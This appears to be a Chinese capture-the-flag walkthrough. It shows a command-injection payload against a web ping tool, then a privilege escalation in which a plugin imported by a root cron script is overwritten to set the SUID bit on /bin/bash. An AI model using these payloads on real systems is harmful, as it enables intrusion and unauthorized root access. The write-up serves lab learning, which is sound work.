在网络诊断 /diag 下存在一个 Ping 工具，输入 127.0.0.1 测试一下。

发了四个 ICMP 包，大致可以猜到命令是 ping -c 4 [我们输入的IP]。

这里的原理是：ping -c 4 127.0.0.1$(id) ，shell 会优先执行括号里的 id，然后拿到 id 的输出文本，再把文本替换回原来的位置再执行 ping。

#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""VaultKeeper 备份报表主程序 —— 由 root 定时任务每分钟执行一次。

主程序本身受控不可写，统计逻辑交由运维组维护的插件实现。
"""
import sys
import datetime

sys.dont_write_bytecode = True
sys.path.insert(0, "/opt/vault/plugins")

try:
    import vault_report_plugin
    result = vault_report_plugin.generate()
except Exception as exc:            # 插件异常不应中断报表任务
    result = {"status": "error", "detail": str(exc)}

print("[%s] VaultKeeper report: plugin=vault_report_plugin result=%s"
      % (datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), result))

作为 ops 用户，只有读权限，所以无法直接修改。

读脚本源码，逻辑是：

  • sys.path.insert(0, "/opt/vault/plugins") 将 /opt/vault/plugins 目录加入 Python 导入搜索路径。因为 Python 导入模块时，会按顺序扫描 sys.path 里的目录，这一行强制优先去 /opt/vault/plugins 导入。
  • import vault_report_plugin 引入 vault_report_plugin。
  • result = vault_report_plugin.generate() 执行模块中的 generate() 函数。

所以思路为篡改 vault_report_plugin，让其执行系统命令，从而提权到 root。

ops@Maze:~$ cat > /opt/vault/plugins/vault_report_plugin.py <<'EOF'
> import os
> def generate():
>     os.system("chmod u+s /bin/bash")
>     return {"status": "ok"}
> EOF

等待一分钟，等定时任务执行。
